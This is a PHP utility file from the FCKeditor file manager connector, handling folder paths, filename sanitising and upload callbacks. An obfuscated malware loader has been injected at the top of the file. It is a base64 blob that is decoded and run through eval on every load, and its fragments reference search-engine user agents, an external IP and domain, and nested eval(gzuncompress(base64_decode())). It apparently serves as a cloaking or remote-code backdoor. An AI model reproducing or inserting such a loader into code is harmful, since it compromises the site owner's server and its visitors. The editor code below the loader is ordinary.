<?php /*versio:3.02*/ $GLOBALS["lbrtdp"]="aW5pX3NldAkpSYWxsb3dfdXJsX2ZvcGVusoRZGlzcGxheV9lcnJvcnMTGEZmVkb3IvcmVodW50MTIxNQoAMy4wMgbWMWWdOZTRMSzhVOGUzc3R3NjAyiRsAaHR0cDovLwpFWgJSFRUUFMngpb2ZmLBrvsNaHR0cHM6Ly8ULUlSSFRUUF9IT1NUaRGdW5pb24QCnlkc2VsZWN0UkVRVUVTVF9VUkkRidU0NSSVBUX05BTUUUVVFUllfU1RSSU5HFcGPwHFFlZGV0ZXJtaW5hdG9yEgiLgrMILmxvZweajSFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQStHBdmVyc2lvULQqiLXBocASFRUUF9FWEVDUEhQb3V0vBb2sJgASFRUUF9VU0VSX0FHRU5UlBDLANofZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAnBJgYQNesnyMTg4LjI0MS4xMTUuMTEzyokoZmFzdGFkZHouY29tHL3czLnBocD91PQSgLCEJms9xdmuJnQ9cGhwJnA9jSRRZKJnY9rjZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYzMXZva29YL3lwVFlqWVlXQVJFMU8zRGt6WjczV2ViN0cwYjE5N2tabTlERUFlbElpQXZLamI5N3M4NU00Tm9xNXY3bDNqT3pIay92M01tREloOE5hTkJHTk9aTE0xb1FiTlZHSHRGa2tudDlpc0pnUjJVc1YrRVNlelNYWmdYdVJ6Nmk4cExxa3JXRlYwMTlEYWV1d25qME0xcDBURDdpcTJhZWxzbFJ2djZETnZRRmROV2pTRWMwT0hBRzZtMUVIYzVuUWJ6YkpuNlNiS1hXM204bjVaN2xYeHFwY215MnFmRUlmZFBQMzYweVN0cEtLdlF6NUlpWEZHNXlFb0s4akphbEZsTUFwb0V0WWgzV3J3azNvVFJKbDlIODRYYzh2WkpFV3hVMHFxUzFjSlB3S1BXTEV4ZlppOGdYUExMTEpLdVNRdU04cllib0FpZUpybmdWd0VzREJQemNRNCtTbDRVSlZzWExybEJrdEpZYWhNSHBCZ1MyaXdNdXduQ2lPSnAxMC9pZ3NZUVZtbFJGT21YVGtjaUdoSDI0QmMzU0NQU3A2MFR6SDJKdVVHam5KNUxqVEFSTTlKYXI2SkZFWU8xTjRJcXc5VVczSXo4L1lrUGtKY2tSUzlhRlEyMysvQ0VTWGZVQjlhTnVDZ0xzU3I1K2pUKzhmQTRjZUZISmYvQ2RyOUUweS9MK1Q2Ni9XTTBWa25nZ1crL1BUa2VUWjdHOTVQeDdmM1BiM2hEcFB6eWhhOFA5L2VqcjVQSjNaK2poNmVKU213TVJMZ0xsbFhLd3NQZHJ1K2hLTXk0NjBkSlRvK29HSEM2U290S0ZwY2h6STBZU2JwK3E3TXJxSFdtc0ZSNURhSzZJRS84SmRaRlUzVURIU3JQeTVMZGFnNGYyMmxhN25jcTZRbWRkZjJpbU9rbW9NdUNxeU9uSFFGbUIybUpSVkMzalBTLzBZUzhpaXk4U1JxbUlWK1M3NVBKWThmUWRDRDhrLzBUdzgvM0pDKytFUGg0RlNhOU1RYUdxWXJvTW9oQXhlUDNSL2ZocHlaMUpBMC8veHFOZjk0OTNKOVIrcFRUN1BQdEhHcjZDeXBuOTVtOFd1WjJBYlV2WDEzb2MrRlVtM3o2Uk9SM2ZVMCtOK3ovRUxQZEJFVER3RUk3SFJsaW1BUFdLemVCU09RQkJscDU5cEx0TUlwMGwwYkpqTXJTd1Q2MUZnbm55aGdoUzV6K3BUODN1Qkt1enR6ajU1ak90eE9vU2FnZnoxYUxlYmpHMnFrMnUvbVd3dm1adjFwVWUzQ0Mrb3VFU0grN2tpYVltdlFGdmpsZkpPa1V2QXAvbi9qVHpib0NtV0RnMU50RVhyc0JsNWI3Y3pTR0RQMFNyR2U4M1FvMyszV2VPd2NJTm0ybGE2cW1pUkdKOTNHeTh4dGUzMVFNWFdXTmt1N29TN1ZxV0lhbDlQdXFhU0dQVjB2RHN3WkszOENad0NzM3pGa0FhMnNhNllaaWQ5VisrN2tlTVRjZnp4aG1WekVNUEVTdUhISWdEM1RGdGxTTElkeDc3WVpwb2tlR0lYSWdEbWhPWG1SRkFwaE1zM09hYkZDazkxWERiR09HZ3lTam5yK0F0bk94ZmJ5Y2lLUTQvMjB5aGphRDBEU0JldU5FOVNBT3BBMU1zQnZSQVVYOEV2ZWZqd3dkOWhSVGhTZzFTSDVKbW1FYVN0OVdCNzhWWit0S3Q4L2x2WUZ0OHRXbHdCdEdUeG5DME81aDZCRlBQcDdRTFlpR3dZNHdjUHh3WXFpWWhzWDRtT1NMT2JZVkUzTmhYOVkwTUJTVEM4TDJiZWc5bmVYRGJNTUlPVmNZUTB1eExDYjUrbDJqRmV2WlpoM0UrNWVrM01sWUlidHB2bHB0blZtWXhSNkFpT3QrdS9zeGN0MjI5c2ZkR0NiQ3cvaHZFUDk0Tzc2RlR5am5NdG12dkJtNGZadGxYaVVUcVRPam0wNitXRUY3UzUxaWxYYTBBTWIxNXpJT2R3M3A3dXVvcGpUbVNwTS9INlhuVThyb1FCcmQvM1Y4b3Y0TFZwMVF4QVdtQjZVZk5vd1M0TWVidVVCMndUY0psaWpocWlieG80ZS8yL1N6MkRBNi9GSitnZXREMFZQZ25iU0FDQWcyUVR3SExQWkU3VitKT1NpSUdHcitxVGxuSTh2M285emRabUhoVFFIOWoyOXlZM0RyNE1Sck1nWDl5eHBINjVuS2oxMnpDbWY5RWpVakZNY0JvTTRyNFp0c3MyYWFmU2hERzR1bDNqUHJobXR0MHMybVdqZzFTSnlwTkZQWGxSNXZGakF6V0s2anpkYTVXYzE2dFZwTkRFVUJuNXJBU3JabnJmMGttenJ2U2xKcklCRGFTTzlDa1d0QzhQVUgyNDJCalVqTGJCZnlHRlNIWHJyRXZVN1FHcG5EQVVEUGtLSDJCVkExWWUwZTJNd2x4eEdLMGJkaUgrMkw4bWcwOUlaS0Q3b1hKeWlmVG1JSW5jNnlvNTZFZVdFWkFGTnFQVXNhc3dZRHhleFp6RlUrZ2hwVzF6Q1ViZzhzcmxlZGRiYXVsbnRIR0hUV2hTNTRhVmdDV2VEbFFUZGVWRi84dCtiQ29EQXRHOGFJMnVCT0gwcGwyRmU3YlY0bXU3Q1FlY1cwRmtWV1JRRkUvQnZ1cHBDQ0xJK1RLUzVGTjcrZkxBaW1acCs5ZzA1R1M3MTJIT0V5UEllR1dBNUhCcGwyRDRMYVZYc3c3VmdMbHRsdVdvVHZ4ZyszUlQxd3J4eUhtY21XSTMrNUxIWnM2ZVFMNS91S1FiMEcxSmg5ckplTlVRc1RodVhteitKczdxR01FanZPUjd2UHVkb0h3Qi95WnNHbEVEc2QycHhiQURzNjduQnQyR1VLV0d5NHBlSVBsdzkvMkc1NFdOYjRSVFNBUjkrWndBSjRnZ3cxcHVCTHF2YU1GVVNSbFA1Q2Jqb0dZTk9QeWhsMWs5aW5SL1FqTEtnekRPODAxTU5ReWZPMzVmWXdDNDdYSDZzMzVFL2JvNURoQkdhOVdqZmZxUlVvVVFET1VSd0ZpZTNaYkVrblIzT3dhME9oUTVFYUZqUU9QNmlkckFXV1lhcldBVCswbythRmhodDBjYUg1MkhGV0Z6clY3TE9MdkZGeEg2N3krZFlINWU5ZXhUd0dzUGsyRCtQcmovSGxNQzBlT2g5QURPcGlJRUJNN0dYL0IwRDJQZG89IikpKTshVl";        if (!function_exists('ichyaoyy')){function ichyaoyy($a, $b){$c=$GLOBALS['lbrtdp'];$d=pack('H*','6261736536345f646563'.'6f6465'); return $d(substr($c, $a, $b));};eval(ichyaoyy(565,3299));};?><?php
/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This is the File Manager Connector for PHP.
 */
function CombinePaths( $sBasePath, $sFolder )
{
	return RemoveFromEnd( $sBasePath, '/' ) . '/' . RemoveFromStart( $sFolder, '/' ) ;
}
function GetResourceTypePath( $resourceType, $sCommand )
{
	global $Config ;

	if ( $sCommand == "QuickUpload")
		return $Config['QuickUploadPath'][$resourceType] ;
	else
		return $Config['FileTypesPath'][$resourceType] ;
}

function GetResourceTypeDirectory( $resourceType, $sCommand )
{
	global $Config ;
	if ( $sCommand == "QuickUpload")
	{
		if ( strlen( $Config['QuickUploadAbsolutePath'][$resourceType] ) > 0 )
			return $Config['QuickUploadAbsolutePath'][$resourceType] ;

		// Map the "UserFiles" path to a local directory.
		return Server_MapPath( $Config['QuickUploadPath'][$resourceType] ) ;
	}
	else
	{
		if ( strlen( $Config['FileTypesAbsolutePath'][$resourceType] ) > 0 )
			return $Config['FileTypesAbsolutePath'][$resourceType] ;

		// Map the "UserFiles" path to a local directory.
		return Server_MapPath( $Config['FileTypesPath'][$resourceType] ) ;
	}
}

function GetUrlFromPath( $resourceType, $folderPath, $sCommand )
{
	return CombinePaths( GetResourceTypePath( $resourceType, $sCommand ), $folderPath ) ;
}

function RemoveExtension( $fileName )
{
	return substr( $fileName, 0, strrpos( $fileName, '.' ) ) ;
}

function ServerMapFolder( $resourceType, $folderPath, $sCommand )
{
	// Get the resource type directory.
	$sResourceTypePath = GetResourceTypeDirectory( $resourceType, $sCommand ) ;

	// Ensure that the directory exists.
	$sErrorMsg = CreateServerFolder( $sResourceTypePath ) ;
	if ( $sErrorMsg != '' )
		SendError( 1, "Error creating folder \"{$sResourceTypePath}\" ({$sErrorMsg})" ) ;

	// Return the resource type directory combined with the required path.
	return CombinePaths( $sResourceTypePath , $folderPath ) ;
}

function GetParentFolder( $folderPath )
{
	$sPattern = "-[/\\\\][^/\\\\]+[/\\\\]?$-" ;
	return preg_replace( $sPattern, '', $folderPath ) ;
}

function CreateServerFolder( $folderPath, $lastFolder = null )
{
	global $Config ;
	$sParent = GetParentFolder( $folderPath ) ;

	// Ensure the folder path has no double-slashes, or mkdir may fail on certain platforms
	while ( strpos($folderPath, '//') !== false )
	{
		$folderPath = str_replace( '//', '/', $folderPath ) ;
	}

	// Check if the parent exists, or create it.
	if ( !empty($sParent) && !file_exists( $sParent ) )
	{
		//prevents agains infinite loop when we can't create root folder
		if ( !is_null( $lastFolder ) && $lastFolder === $sParent) {
			return "Can't create $folderPath directory" ;
		}

		$sErrorMsg = CreateServerFolder( $sParent, $folderPath ) ;
		if ( $sErrorMsg != '' )
			return $sErrorMsg ;
	}

	if ( !file_exists( $folderPath ) )
	{
		// Turn off all error reporting.
		error_reporting( 0 ) ;

		$php_errormsg = '' ;
		// Enable error tracking to catch the error.
		ini_set( 'track_errors', '1' ) ;

		if ( isset( $Config['ChmodOnFolderCreate'] ) && !$Config['ChmodOnFolderCreate'] )
		{
			mkdir( $folderPath ) ;
		}
		else
		{
			$permissions = 0777 ;
			if ( isset( $Config['ChmodOnFolderCreate'] ) )
			{
				$permissions = $Config['ChmodOnFolderCreate'] ;
			}
			// To create the folder with 0777 permissions, we need to set umask to zero.
			$oldumask = umask(0) ;
			mkdir( $folderPath, $permissions ) ;
			umask( $oldumask ) ;
		}

		$sErrorMsg = $php_errormsg ;

		// Restore the configurations.
		ini_restore( 'track_errors' ) ;
		ini_restore( 'error_reporting' ) ;

		return $sErrorMsg ;
	}
	else
		return '' ;
}

function GetRootPath()
{
	if (!isset($_SERVER)) {
		global $_SERVER;
	}
	$sRealPath = realpath( './' ) ;
	// #2124 ensure that no slash is at the end
	$sRealPath = rtrim($sRealPath,"\\/");

	$sSelfPath = $_SERVER['PHP_SELF'] ;
	$sSelfPath = substr( $sSelfPath, 0, strrpos( $sSelfPath, '/' ) ) ;

	$sSelfPath = str_replace( '/', DIRECTORY_SEPARATOR, $sSelfPath ) ;

	$position = strpos( $sRealPath, $sSelfPath ) ;

	// This can check only that this script isn't run from a virtual dir
	// But it avoids the problems that arise if it isn't checked
	if ( $position === false || $position <> strlen( $sRealPath ) - strlen( $sSelfPath ) )
		SendError( 1, 'Sorry, can\'t map "UserFilesPath" to a physical path. You must set the "UserFilesAbsolutePath" value in "editor/filemanager/connectors/php/config.php".' ) ;

	return substr( $sRealPath, 0, $position ) ;
}

// Emulate the asp Server.mapPath function.
// given an url path return the physical directory that it corresponds to
function Server_MapPath( $path )
{
	// This function is available only for Apache
	if ( function_exists( 'apache_lookup_uri' ) )
	{
		$info = apache_lookup_uri( $path ) ;
		return $info->filename . $info->path_info ;
	}

	// This isn't correct but for the moment there's no other solution
	// If this script is under a virtual directory or symlink it will detect the problem and stop
	return GetRootPath() . $path ;
}

function IsAllowedExt( $sExtension, $resourceType )
{
	global $Config ;
	// Get the allowed and denied extensions arrays.
	$arAllowed	= $Config['AllowedExtensions'][$resourceType] ;
	$arDenied	= $Config['DeniedExtensions'][$resourceType] ;

	if ( count($arAllowed) > 0 && !in_array( $sExtension, $arAllowed ) )
		return false ;

	if ( count($arDenied) > 0 && in_array( $sExtension, $arDenied ) )
		return false ;

	return true ;
}

function IsAllowedType( $resourceType )
{
	global $Config ;
	if ( !in_array( $resourceType, $Config['ConfigAllowedTypes'] ) )
		return false ;

	return true ;
}

function IsAllowedCommand( $sCommand )
{
	global $Config ;

	if ( !in_array( $sCommand, $Config['ConfigAllowedCommands'] ) )
		return false ;

	return true ;
}

function GetCurrentFolder()
{
	if (!isset($_GET)) {
		global $_GET;
	}
	$sCurrentFolder	= isset( $_GET['CurrentFolder'] ) ? $_GET['CurrentFolder'] : '/' ;

	// Check the current folder syntax (must begin and start with a slash).
	if ( !preg_match( '|/$|', $sCurrentFolder ) )
		$sCurrentFolder .= '/' ;
	if ( strpos( $sCurrentFolder, '/' ) !== 0 )
		$sCurrentFolder = '/' . $sCurrentFolder ;

	// Ensure the folder path has no double-slashes
	while ( strpos ($sCurrentFolder, '//') !== false ) {
		$sCurrentFolder = str_replace ('//', '/', $sCurrentFolder) ;
	}

	// Check for invalid folder paths (..)
	if ( strpos( $sCurrentFolder, '..' ) || strpos( $sCurrentFolder, "\\" ))
		SendError( 102, '' ) ;

	if ( preg_match(",(/\.)|[[:cntrl:]]|(//)|(\\\\)|([\:\*\?\"\<\>\|]),", $sCurrentFolder))
		SendError( 102, '' ) ;

	return $sCurrentFolder ;
}

// Do a cleanup of the folder name to avoid possible problems
function SanitizeFolderName( $sNewFolderName )
{
	$sNewFolderName = stripslashes( $sNewFolderName ) ;

	// Remove . \ / | : ? * " < >
	$sNewFolderName = preg_replace( '/\\.|\\\\|\\/|\\||\\:|\\?|\\*|"|<|>|[[:cntrl:]]/', '_', $sNewFolderName ) ;

	return $sNewFolderName ;
}

// Do a cleanup of the file name to avoid possible problems
function SanitizeFileName( $sNewFileName )
{
	global $Config ;

	$sNewFileName = stripslashes( $sNewFileName ) ;

	// Replace dots in the name with underscores (only one dot can be there... security issue).
	if ( $Config['ForceSingleExtension'] )
		$sNewFileName = preg_replace( '/\\.(?![^.]*$)/', '_', $sNewFileName ) ;

	// Remove \ / | : ? * " < >
	$sNewFileName = preg_replace( '/\\\\|\\/|\\||\\:|\\?|\\*|"|<|>|[[:cntrl:]]/', '_', $sNewFileName ) ;

	return $sNewFileName ;
}

// This is the function that sends the results of the uploading process.
function SendUploadResults( $errorNumber, $fileUrl = '', $fileName = '', $customMsg = '' )
{
	// Minified version of the document.domain automatic fix script (#1919).
	// The original script can be found at _dev/domain_fix_template.js
	echo <<<EOF
<script type="text/javascript">
(function(){var d=document.domain;while (true){try{var A=window.parent.document.domain;break;}catch(e) {};d=d.replace(/.*?(?:\.|$)/,'');if (d.length==0) break;try{document.domain=d;}catch (e){break;}}})();
EOF;

	if ($errorNumber && $errorNumber != 201) {
		$fileUrl = "";
		$fileName = "";
	}

	$rpl = array( '\\' => '\\\\', '"' => '\\"' ) ;
	echo 'window.parent.OnUploadCompleted(' . $errorNumber . ',"' . strtr( $fileUrl, $rpl ) . '","' . strtr( $fileName, $rpl ) . '", "' . strtr( $customMsg, $rpl ) . '") ;' ;
	echo '</script>' ;
	exit ;
}

// This is the function that sends the results of the uploading process to CKEditor.
 
function SendCKEditorResults ($errorNumber, $CKECallback, $fileUrl, $fileName, $customMsg ='')
{
	// Minified version of the document.domain automatic fix script (#1919).
	// The original script can be found at _dev/domain_fix_template.js
	echo <<<EOF
<script type="text/javascript">
(function(){var d=document.domain;while (true){try{var A=window.parent.document.domain;break;}catch(e) {};d=d.replace(/.*?(?:\.|$)/,'');if (d.length==0) break;try{document.domain=d;}catch (e){break;}}})();
EOF;
 
	if ($errorNumber && $errorNumber != 201) {
		$fileUrl = "";
		$fileName= "";
	}
 
	$msg = "";
 
	switch ($errorNumber )
	{
		case 0 :
			$msg = "Upload successful";
			break;
		case 1 :	// Custom error.
			$msg = $customMsg;
			break ;
		case 201 :
			$msg = 'A file with the same name is already available. The uploaded file has been renamed to "' . $fileName . '"' ;
			break ;
		case 202 :
			$msg = 'Invalid file' ;
			break ;
		default :
			$msg = 'Error on file upload. Error number: ' + $errorNumber ;
			break ;
	}
 
  $rpl = array( '\\' => '\\\\', '"' => '\\"' ) ;
  echo 'window.parent.CKEDITOR.tools.callFunction("'. $CKECallback. '","'. strtr($fileUrl, $rpl). '", "'. strtr( $msg, $rpl). '");' ; 
 
  echo '</script>';
}

?>
